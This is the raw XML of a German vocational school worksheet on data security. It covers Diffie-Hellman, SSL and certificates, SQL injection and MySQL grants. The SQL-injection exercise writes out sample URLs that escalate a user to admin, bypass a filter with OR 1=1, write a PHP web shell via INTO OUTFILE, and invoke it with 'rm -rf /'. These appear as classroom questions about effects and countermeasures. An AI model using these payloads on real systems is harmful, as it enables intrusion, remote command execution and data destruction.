      <text:p text:style-name="P11">M=decrypt(C,symKey) </text:p>
      <text:p text:style-name="P11">% <text:s text:c="7"/>... the modulo Operator </text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P9">Question 1: The _____________ <text:s/>returns _______ <text:s/>and ____ for calculation of the public keys. </text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Question 2: Alice wants to send a message M to Bob using Diffie-Hellman: </text:p>
      <text:p text:style-name="P9">Answer: </text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/>1. Alice sends ____________ <text:s/>to Bob. </text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/>2. Alice calculates the symmetric Key symKey = ____________________</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/>3. Alice gets from _________ <text:s/>the Public Key of <text:s/>____________ ___________</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/>4. Alice encrypts her message M: <text:s/>C = <text:s/>______________________ ________</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/>5. Bob calculates symKey= <text:s/>________________________________________ </text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/>6. Bob decrypts C with: M= <text:s/>____________________ ____________________</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/>7. Bob receives ____________ <text:s/>from Alice. </text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/>8. Bob gets from ________________ <text:s/>the Publc Key of <text:s text:c="2"/>______________ ___</text:p>
      <text:p text:style-name="P9"/>
      <text:h text:style-name="P67" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__21052_660407764"/>ANLAGE Diffie-Hellman 2/2<text:bookmark-end text:name="__RefHeading__21052_660407764"/></text:h>
      <text:p text:style-name="P9">Question 3: Calculation-Example </text:p>
      <text:p text:style-name="P9">Given: use the following values to calculate APK,BPK, symKey. </text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/>Alice and Bob use n = 13 and g = 2. </text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/>Alice uses ASN = 5. </text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/>Bob uses BSN = 8. </text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Alice: </text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/>The formular to calculate APK= <text:s/>____________________ ______________</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/>The value of APK= <text:s text:c="2"/>________________________________ ______________</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Bob: </text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/>The formular to calculate BPK= <text:s/>_____________________ _____________</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/>The value of BPK= <text:s text:c="2"/>_________________________________ _____________</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Alice: </text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/>The formular to calculate symKey= <text:s/>__________________ ____________</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/>The value of symKey= <text:s text:c="2"/>______________________________ ____________</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Bob: </text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/>The formular to calculate symKey= <text:s/>__________________ ____________</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T6"><text:s text:c="4"/>The value of symKey= <text:s text:c="2"/>______________________________</text:span></text:span></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:h text:style-name="P68" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__21132_660407764"/>ANLAGE SSL <text:span text:style-name="T12">1/3</text:span><text:bookmark-end text:name="__RefHeading__21132_660407764"/></text:h>
      <text:p text:style-name="Standard"><text:span text:style-name="T11">Setzen Sie die folg. Worte/Begriffe <text:s/>richtig ein: </text:span>PRIVATE_KEY, SERVER, ECHTHEIT<text:span text:style-name="T10">(=</text:span>AUTHENTIZITÄT<text:span text:style-name="T10">)</text:span>, ECHTHEIT des PUB-Keys,<text:span text:style-name="T10">TCP, <text:s/></text:span>DIGITALE ZERTIFIKATE, SERVER-ZERTIFIKAT, <text:s/>SIGNED, </text:p>
      <text:p text:style-name="Standard"/>
      <text:list xml:id="list2731468537538843927" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P44">SSL ist ein Protokoll, das den Dienst zur a) Verschlüsselung und zur <text:line-break/>b) ________________________ von Internetverbindungen bereit stellt. <text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P44">Das Server-Zertifikat bestätigt die ______________________ des _________________________<text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P44">SSL liegt als Schicht zwischen ______________ <text:s/>und den Anwendungsprotokollen .<text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P44">SSL verwendet <text:s text:c="2"/>a) RSA-Schlüsselpaare und <text:s/>b)______________________________________ <text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P44">Private Zertifizierungs-Stellen erzeugen sogenannte SELF-_____________________ Zertifikate .<text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P44">Die CA signiert das ______________________________ mit ihrem _________________, womit die ECHTHEIT der Daten bestätigt wird. <text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P44">Warum sollte man eventuell den Private-Key nicht mit einer Passphrase schützen? <text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P44">Bei der Erstellung eines CSR für ein Server-Zertifikat muss die Angabe für cn folgendes beinhalten: <text:s/>cn= ____________________________________ <text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P45">Unter signieren, versteht man ______________________________________________________ <text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P45">Ein Zertifikat beinhaltet u.a. folgendes: <text:line-break/>1. <text:s/>________________________________________________ <text:line-break/>2. _________________________________________________ <text:line-break/>3. _________________________________________________ <text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P45">symmetrische Verschlüsselung ist schneller als asymmetrische Verschlüsselung <text:line-break/>o wahr <text:s/>o falsch<text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P45">CA Stamm/Root Zertifikat ist ein self-signed Zertifikat <text:line-break/>o wahr <text:s/>o falsch </text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="P64" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__21134_660407764"/>ANLAGE SSL <text:span text:style-name="T12">2/3</text:span><text:bookmark-end text:name="__RefHeading__21134_660407764"/></text:h>
      <text:list xml:id="list150257475861985" text:continue-numbering="true" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P45">Man signiert um den Sicherheits-Dienst <text:line-break/>o Verschüsselung oder <text:s text:c="4"/>o Echtheit zu garantieren. <text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P45">Wie kann ein Browser feststellen, dass das Server-Zertifikat wirklich von der jeweilgen CA signiert wurde? <text:line-break/><text:line-break/>Antwort 1: w o wahr <text:s/>o falsch <text:line-break/>Es wird der public-key der CA verwendet. Er 'passt' zum private-key der CA, der ja für das Signieren des Server-Zertifikates verwendet wurde. <text:line-break/><text:line-break/>Antwort 2: f o wahr <text:s/>o falsch <text:line-break/>Es wird der private-key der CA verwendet. Er 'passt' zum public-key der CA, der ja für das Signieren des Server-Zertifikates verwendet wurde. <text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P45">Wie kann garantiert werden, dass der public-key der CA wirklich von der CA kommt? <text:line-break/><text:line-break/>Antwort 1: w o wahr <text:s/>o falsch <text:line-break/>Auch die CA besitzt ein sogenanntes STAMM/ROOT-Zertifikat, indem sich deren öffentlicher Schlüssel befindet. Das CA-STAMM-Zertifikat wird in Browsern und Betriebssystemen hinterlegt. <text:line-break/><text:line-break/>Antwort 2: fo wahr <text:s/>o falsch <text:line-break/>Auch die CA besitzt ein sogenanntes Server-Zertifikat, indem sich deren öffentlicher Schlüssel befindet. Das CA-SERVER-Zertifikat wird in Browsern und Betriebssystemen hinterlegt. <text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P46">Was passiert, wenn im Browser/Betriebssystem kein Stamm-Zertifikat hinterlegt ist? <text:line-break/><text:line-break/>Antwort 1: w o wahr <text:s/>o falsch <text:line-break/>Der Benutzer wird informiert und gefragt, ob die Website dennoch geladen werden soll, d.h. ob dem public-key des Servers vertraut werden soll. <text:line-break/><text:line-break/>Antwort 2: f o wahr <text:s/>o falsch <text:line-break/>Der Benutzer wird informiert und gefragt, ob die Website dennoch geladen werden soll, d.h. ob dem private-key des Servers vertraut werden soll. <text:line-break/><text:line-break/><text:soft-page-break/></text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="P63" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__21136_660407764"/>ANLAGE SSL 3/3<text:bookmark-end text:name="__RefHeading__21136_660407764"/></text:h>
      <text:list xml:id="list150258182708076" text:continue-numbering="true" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P45">Wie kann nun der Browser vestellen, ob das Server-Zertifiktat (also der public-key) wirklich vom Server stammt? (=Echtheit) <text:line-break/><text:line-break/>Antwort 1: w o wahr <text:s/>o falsch <text:line-break/>Die CA installiert ihr eigenes CA-Stamm-Zertifikat (also seinen eigenen public-key) beim Browser. <text:line-break/><text:line-break/>Antwort 2: f o wahr <text:s/>o falsch <text:line-break/>Die CA installiert ihr eigenes CA-Stamm-Zertifikat (also seinen eigenen private-key) beim Browser. <text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P43"><text:span text:style-name="T10">Woran erkannt man, dass es sich um ein selbst-signiertes Zertifikat handelt? <text:line-break/><text:line-break/>Antwort 1: w o wahr <text:s/>o falsch<text:line-break/>Da Subject: (zertifizierter Gegenstand) und Issuer: (Zertifikats-Aussteller) identisch sind, handelt es sich um ein selbst-signiertes Zertifikat. <text:line-break/> </text:span><text:line-break/>Antwort 2: f o wahr <text:s/>o falsch <text:line-break/>Da Subject: (Zertifikats-Aussteller) und Issuer: (zertifizierter Gegenstand) identisch sind, handelt es sich um ein selbst-signiertes Zertifikat. <text:line-break/><text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P43"><text:span text:style-name="T10">Woran erkannt man, dass es sich um ein CA Zertifikat handelt? <text:line-break/><text:line-break/>Antwort </text:span>1<text:span text:style-name="T10">: w o wahr <text:s/>o falsch <text:line-break/>Im Bereich X509v3 Basic Constraints: ist anhand von CA:TRUE auch erkennbar, dass es sich um ein CA-Zertifikat handelt. <text:line-break/><text:line-break/>Antwort </text:span>2<text:span text:style-name="T10">: f o wahr <text:s/>o falsch <text:line-break/>Da Subject: (zertifizierter Gegenstand) und Issuer: (Zertifikats-Aussteller) identisch sind, handelt es sich um ein selbst-signiertes Zertifikat. <text:line-break/></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7"/></text:span></text:p>
      <text:h text:style-name="P60" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__23563_660407764"/><text:soft-page-break/>A<text:span text:style-name="T14">NLAGE</text:span>: DB-SEC: SQL-Injection<text:bookmark-end text:name="__RefHeading__23563_660407764"/></text:h>
      <text:p text:style-name="P14">Quelle: <text:a xlink:type="simple" xlink:href="https://de.wikipedia.org/wiki/SQL-Injection">https://de.wikipedia.org/wiki/SQL-Injection</text:a></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P17">Auf einem Webserver befindet sich das Script find.cgi zum Anzeigen von Artikeln. Das Script akzeptiert den Parameter „ID“, welcher später Bestandteil der SQL-Abfrage wird. Folgende Tabelle soll dies illustrieren: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4">Erwarteter Aufruf</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle4.A2" office:value-type="string">
            <text:p text:style-name="P17">Aufruf</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle4.B6" office:value-type="string">
            <text:p text:style-name="P17"/>
            <text:p text:style-name="P17"><text:span text:style-name="Source_20_Text">http://webserver/cgi-bin/find.cgi?ID=</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T15">42</text:span></text:span></text:p>
            <text:p text:style-name="P17"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T15"/></text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle4.A2" office:value-type="string">
            <text:p text:style-name="P17">Erzeugtes SQL</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle4.B6" office:value-type="string">
            <text:p text:style-name="P17"/>
            <text:p text:style-name="P17"><text:span text:style-name="Source_20_Text">SELECT author, subject, text FROM artikel WHERE ID=</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T15">42</text:span></text:span><text:span text:style-name="Source_20_Text">;<text:line-break/></text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row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4">SQL-Injection</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle4.A2" office:value-type="string">
            <text:p text:style-name="P17">Aufruf</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle4.B6" office:value-type="string">
            <text:p text:style-name="P17"/>
            <text:p text:style-name="P17"><text:a xlink:type="simple" xlink:href="http://webserver/cgi-bin/find.cgi?ID=42;UPDATE+USER+SET+TYPE"><text:span text:style-name="Source_20_Text">http://webserver/cgi-bin/find.cgi?ID=</text:span></text:a><text:a xlink:type="simple" xlink:href="http://webserver/cgi-bin/find.cgi?ID=42;UPDATE+USER+SET+TYPE"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T16">42;UPDATE+USER+SET+TYPE</text:span></text:span></text:a><text:span text:style-name="Source_20_Text"><text:span text:style-name="T16">="admin"+WHERE+ID=23</text:span></text:span></text:p>
            <text:p text:style-name="P17"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T16"/></text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle4.A2" office:value-type="string">
            <text:p text:style-name="P17">Erzeugtes SQL</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle4.B6" office:value-type="string">
            <text:p text:style-name="P17"/>
            <text:p text:style-name="P17"><text:span text:style-name="Source_20_Text">SELECT author, subject, text FROM artikel <text:line-break/>WHERE ID=</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T16">42;UPDATE USER SET TYPE="admin" WHERE ID=23</text:span></text:span><text:span text:style-name="Source_20_Text">;</text:span></text:p>
            <text:p text:style-name="P17"><text:span text:style-name="Source_20_Text"/></text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P15">1. Besprechen Sie den in der Tabelle <text:span text:style-name="T17">oben </text:span>dargestellten Angriff. Was wird damit erreicht?</text:p>
      <text:p text:style-name="P15">2. Was passiert, wenn folg. eingeben wird?</text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T18">http://webserver/cgi-bin/find.cgi?ID=42</text:span><text:span text:style-name="T19">+</text:span><text:span text:style-name="T20">OR</text:span><text:span text:style-name="T21">+</text:span><text:span text:style-name="T20">1=1</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">3. <text:span text:style-name="T24">Was passiert, wenn folg. eingeben wird?</text:span></text:p>
      <text:p text:style-name="P32"><text:span text:style-name="T18">http://webserver/cgi-bin/find.cgi?ID=42</text:span><text:span text:style-name="T19">+</text:span><text:span text:style-name="T22">union</text:span><text:span text:style-name="T21">+</text:span><text:span text:style-name="T22">select</text:span><text:span text:style-name="T21">+</text:span><text:span text:style-name="T22">"</text:span><text:span text:style-name="T23">&lt;</text:span><text:span text:style-name="T22">?</text:span><text:span text:style-name="T23">php</text:span><text:span text:style-name="T22"> system($_REQUEST['cmd']);?&gt;"</text:span><text:span text:style-name="T21">+</text:span><text:span text:style-name="T22">,''</text:span><text:span text:style-name="T21">+</text:span><text:span text:style-name="T22">INTO</text:span><text:span text:style-name="T21">+</text:span><text:span text:style-name="T22">OUTFILE '</text:span><text:span text:style-name="T23">/Applications/XAMPP/xamppfiles/htdocs/</text:span><text:span text:style-name="T22">hack.php</text:span><text:span text:style-name="T25"> </text:span></text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P26">und ein anschließender Aufruf der folgenden Art erfolgt: </text:p>
      <text:p text:style-name="P27"><text:span text:style-name="T26">http://webserver/hack.php?</text:span><text:span text:style-name="T28">cmd=</text:span><text:span text:style-name="T29">rm+-rf-/</text:span></text:p>
      <text:p text:style-name="P16">4. Welche Gegenmaßnahmen müssen ergriffen werden?</text:p>
      <text:p text:style-name="P17"/>
      <text:h text:style-name="P60" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__7861_1458299649"/><text:soft-page-break/>A<text:span text:style-name="T14">NLAGE</text:span>: DB-SEC: grant<text:bookmark-end text:name="__RefHeading__7861_1458299649"/></text:h>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P33">drop database if exists is_schule; </text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33">create database if not exists is_schule </text:p>
      <text:p text:style-name="P33">DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci; </text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33">grant create,drop, references, select,insert,update,delete </text:p>
      <text:p text:style-name="P33">on is_schule.* to is_schule@localhost identified by 'comein'; </text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33">use is_schule; </text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33">-- ----------------------------------------------------- </text:p>
      <text:p text:style-name="P33">-- Table `is_schule`.`Abteilungen` </text:p>
      <text:p text:style-name="P33">-- ----------------------------------------------------- </text:p>
      <text:p text:style-name="P33">CREATE <text:s/>TABLE IF NOT EXISTS `is_schule`.`Abteilungen` ( </text:p>
      <text:p text:style-name="P33"><text:tab/>`id`<text:tab/><text:tab/><text:tab/>INT <text:tab/><text:tab/><text:tab/>NOT NULL AUTO_INCREMENT , </text:p>
      <text:p text:style-name="P33"><text:tab/>`name`<text:tab/><text:tab/>VARCHAR(45) <text:tab/>NOT NULL , </text:p>
      <text:p text:style-name="P33"><text:tab/>`vorstand` <text:tab/>VARCHAR(45) <text:tab/>NOT NULL , </text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33"><text:tab/>PRIMARY KEY (`id`) </text:p>
      <text:p text:style-name="P33">) </text:p>
      <text:p text:style-name="P33">ENGINE = InnoDB; </text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P13"><text:span text:style-name="Citation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Verdana4" svg:font-family="Verdana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06pt solid #000000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cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.199cm" style:contextual-spacing="false" fo:line-height="10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2.10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ffffff" fo:padding="0.049cm" fo:border="0.06pt solid #993366" style:shadow="none">
        <style:background-image/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WW8Num35z0" style:family="text">
      <style:text-properties style:font-name="Symbol1" fo:font-family="Symbol" style:font-charset="x-symbol" fo:font-size="9pt" style:font-size-asian="9pt" style:font-name-complex="StarSymbol1" style:font-family-complex="StarSymbol, 'Arial Unicode MS'" style:font-size-complex="9pt"/>
    </style:style>
    <style:style style:name="WW8Num31z0" style:family="text">
      <style:text-properties style:font-name="Symbol1" fo:font-family="Symbol" style:font-charset="x-symbol" fo:font-size="9pt" style:font-size-asian="9pt" style:font-name-complex="StarSymbol1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☑">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="0.395cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="StarSymbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="2" text:style-name="WW8Num35z0" text:bullet-char="□">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="0.79cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="StarSymbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="3" text:style-name="WW8Num35z0" text:bullet-char="☑">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="0.395cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="StarSymbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="4" text:style-name="WW8Num35z0" text:bullet-char="□">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="0.79cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="StarSymbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="5" text:style-name="WW8Num35z0" text:bullet-char="☑">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="0.395cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="StarSymbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="6" text:style-name="WW8Num35z0" text:bullet-char="□">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="0.79cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="StarSymbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="7" text:style-name="WW8Num35z0" text:bullet-char="☑">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="0.395cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="StarSymbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="8" text:style-name="WW8Num35z0" text:bullet-char="□">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="0.79cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="StarSymbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="9" text:style-name="WW8Num35z0" text:bullet-char="☑">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="0.395cm"/>
        </style:list-level-properties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1.247cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="Symbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="2" text:style-name="WW8Num31z0" text:bullet-char="">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="2.494cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="Symbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="3" text:style-name="WW8Num31z0" text:bullet-char="">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="3.741cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="Symbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="4" text:style-name="WW8Num31z0" text:bullet-char="">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="4.988cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="Symbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="5" text:style-name="WW8Num31z0" text:bullet-char="">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="6.235cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="Symbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="6" text:style-name="WW8Num31z0" text:bullet-char="">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="7.482cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="Symbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="7" text:style-name="WW8Num31z0" text:bullet-char="">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="8.729cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="Symbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="8" text:style-name="WW8Num31z0" text:bullet-char="">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position="9.977cm"/>
        </style:list-level-properties>
        <style:text-properties style:font-name="Symbol1"/>
      </text:list-level-style-bullet>
      <text:list-level-style-bullet text:level="9" text:style-name="WW8Num31z0" text:bullet-char="">
        <style:list-level-properties text:list-level-position-and-space-mode="label-alignment">
          <style:list-level-label-alignment text:label-followed-by="listtab" text:list-tab-stop-position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Fachspezifische Softwaretechnik<text:tab/><text:file-name text:display="name-and-extension">rdp-fsst-WEB-NW-PROG-DATENSICHERHEIT.odt</text:file-name><text:tab/>Arbeitsunterlage</text:p>
      </style:header>
      <style:footer>
        <text:p text:style-name="Footer">Informatik<text:tab/><text:tab/><text:page-number text:select-page="current">17</text:page-number>/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16T22:53:54</meta:creation-date>
    <meta:editing-cycles>162</meta:editing-cycles>
    <meta:editing-duration>P5DT12H13M29S</meta:editing-duration>
    <meta:initial-creator>Anton Hofmann</meta:initial-creator>
    <dc:date>2016-06-08T15:02:56.074165560</dc:date>
    <dc:creator>hofmann </dc:creator>
    <meta:printed-by>Anton Hofmann</meta:printed-by>
    <meta:print-date>2011-10-20T19:42:19</meta:print-date>
    <meta:document-statistic meta:table-count="2" meta:image-count="0" meta:object-count="0" meta:page-count="17" meta:paragraph-count="347" meta:word-count="2278" meta:character-count="18232" meta:non-whitespace-character-count="15297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meineVorlagen/arbeitsunterlage.ott" meta:date="2011-05-16T22:53:53"/>
  </office:meta>
</office:document-meta>
</file>